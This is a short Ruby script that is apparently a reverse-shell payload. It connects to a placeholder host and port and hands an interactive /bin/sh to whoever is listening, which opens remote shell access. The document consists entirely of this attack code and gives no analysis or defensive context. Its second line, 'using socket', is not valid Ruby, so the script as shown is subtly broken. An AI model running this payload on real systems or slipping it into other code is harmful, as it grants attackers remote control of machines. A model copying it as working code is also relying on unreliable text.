#!/usr/bin/env ruby
using socket
f=TCPSocket.open("ipaddr",port).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)
